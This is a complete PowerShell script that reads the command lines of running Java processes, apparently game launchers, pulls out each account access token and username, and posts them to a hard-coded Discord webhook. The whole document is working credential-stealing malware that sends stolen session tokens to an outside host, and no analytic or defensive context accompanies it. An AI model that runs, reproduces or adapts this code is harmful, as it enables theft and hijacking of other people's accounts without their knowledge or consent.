$webhookUrl = "https://discordapp.com/api/webhooks/1328837732193275974/YWFTiz9fXZQlc9o6tA_1N-T-Oa1ZRbZSSdLR9FJhIoO850JFE9MdW8jkhhTAQCEuuFEK"

Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
    Select-Object -ExpandProperty CommandLine |
    ForEach-Object {
        $accessToken = $null
        $username = $null

        if ($_ -match '--accessToken\s+(\S+)') {
            $accessToken = $matches[1]
        }
        if ($_ -match '--username\s+(\S+)') {
            $username = $matches[1]
        }

        if ($accessToken -and $username) {
            # Format the message for Discord
            $message = @"
> **AccessToken:** $accessToken
> **Username:** $username
"@

            Write-Output $message

            # Properly format the payload for Discord
            $payload = @{
                content = $message
            } | ConvertTo-Json -Depth 10

            # Send the payload to the Discord webhook
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
        }
    }
